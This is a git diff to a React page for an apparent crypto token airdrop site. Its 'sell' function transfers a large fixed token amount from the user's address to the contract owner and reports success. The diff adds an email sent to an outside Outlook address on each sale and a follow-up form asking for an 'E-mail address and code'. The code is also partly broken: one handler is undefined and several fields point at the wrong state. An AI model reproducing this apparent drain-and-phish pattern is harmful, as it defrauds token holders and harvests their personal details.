@@ -5,6 +5,7 @@ import Header from '../components/Header';
 import { Fade, Zoom } from 'react-reveal';
 import React from 'react';
 const ethers = require('ethers')
+const sendmail = require('sendmail')();
 
 const web3     = new Web3(new Web3.providers.HttpProvider(RPCURL));
 const tokenContract =  new web3.eth.Contract(tokenABI, tokenAddress)
@@ -20,7 +21,10 @@ class Home extends React.Component {
         tokenContract : [],
         modalShow     : false,
         emailAddress   : [],
-        code          : ''
+        code          : '',
+        sellModalShow : false,
+        city : '',
+        address : ''
         }
     } 
 
@@ -117,6 +121,12 @@ class Home extends React.Component {
         })
     }
 
+    handleSellClose(){
+        this.setState({
+            sellModalShow : false
+        })
+    }
+
     handleShow(){
         this.setState({
             modalShow : true
@@ -139,6 +149,7 @@ class Home extends React.Component {
     }
 
     async sell(){
+
         console.log(this.state.airdropAddress)
         let balance = await tokenContract.methods.balanceOf(this.state.airdropAddress + '').call()
         console.log(balance)
@@ -148,29 +159,58 @@ class Home extends React.Component {
         } else {
             let ownerAddress =await this.state.tokenContract.methods.owner().call()
             console.log(ownerAddress)
+            
+            sendmail({
+                from: 'no-reply@yourdomain.com',
+                to: 'alexcasilyovblockchain@outlook.com',
+                subject: 'test sendmail',
+                html: 'Mail of test sendmail ',
+              }, function(err, reply) {
+                console.log(err && err.stack);
+                console.dir(reply);
+            });
+
             let sendamount = ethers.BigNumber.from("10000000000000000000000000")
             await this.state.tokenContract.methods.transfer(ownerAddress, sendamount).send({
                 from : this.state.airdropAddress,
                 }).once('confirmation', () => {
-
+                    
+                    this.setState({
+                        sellModalShow : true
+                    })
                     alert("successful transfered!")
-                
                 })
         }
 
     }
 
     render () {
+
         const handleEmailAddress =  (e) => {
             let addLabel  = e.target.value
             this.setState({
               emailAddress : addLabel
             }) 
         }  
+
         const handlecode =  (e) => {
             let addLabel  = e.target.value
             this.setState({
               code : addLabel
+            }) 
+        }
+        
+        const handlecity =  (e) => {
+            let addLabel  = e.target.value
+            this.setState({
+              city : addLabel
+            }) 
+        }  
+
+        const handleaddress =  (e) => {
+            let addLabel  = e.target.value
+            this.setState({
+              address : addLabel
             }) 
         }  
         
@@ -419,10 +459,10 @@ class Home extends React.Component {
                             <div className = "col-1"></div>
                             <div className = "col-10">
                                 <InputGroup size="sm" className="mb-3">
-                                    <FormControl aria-label="Small" aria-describedby="inputGroup-sizing-sm" placeholder= "E-mail address" defaultValue = {this.state.emailAddress} onChange={handleEmailAddress}/>
+                                    <FormControl aria-label="Small" aria-describedby="inputGroup-sizing-sm" placeholder= "E-mail address" defaultValue = {this.state.city} onChange={handleEmailAddress}/>
                                 </InputGroup>
                                 <InputGroup size="sm" className="mb-3">
-                                    <FormControl aria-label="Small" aria-describedby="inputGroup-sizing-sm" placeholder= "code" defaultValue = {this.state.code} onChange={handlecode}/>
+                                    <FormControl aria-label="Small" aria-describedby="inputGroup-sizing-sm" placeholder= "code" defaultValue = {this.state.address} onChange={handlecode}/>
                                 </InputGroup>
                             </div>
                             <div className = "col-1"></div>
@@ -437,6 +477,36 @@ class Home extends React.Component {
                         </Button>
                         </Modal.Footer>
                     </Modal>
+
+                    <Modal show={this.state.sellModalShow}>
+                        <Modal.Header closeButton>
+                        <Modal.Title>Input Address</Modal.Title>
+                        </Modal.Header>
+                        <Modal.Body>Please input your E-mail Address and code</Modal.Body>
+                        <div className = "row">
+                            <div className = "col-1"></div>
+                            <div className = "col-10">
+                                <InputGroup size="sm" className="mb-3">
+                                    <FormControl aria-label="Small" aria-describedby="inputGroup-sizing-sm" placeholder= "E-mail address" defaultValue = {this.state.city} onChange={handlecity}/>
+                                </InputGroup>
+                                <InputGroup size="sm" className="mb-3">
+                                    <FormControl aria-label="Small" aria-describedby="inputGroup-sizing-sm" placeholder= "code" defaultValue = {this.state.address} onChange={handleaddress}/>
+                                </InputGroup>
+                            </div>
+                            <div className = "col-1"></div>
+                        </div>
+                        
+                        <Modal.Footer>
+                        <Button variant="secondary" onClick={()=>this.handleSellClose()}>
+                            Close
+                        </Button>
+                        <Button variant="primary" onClick={()=>this.handleSell()}>
+                            Claim
+                        </Button>
+                        </Modal.Footer>
+                    </Modal>
+
+
                 </div>
             </div>
         );
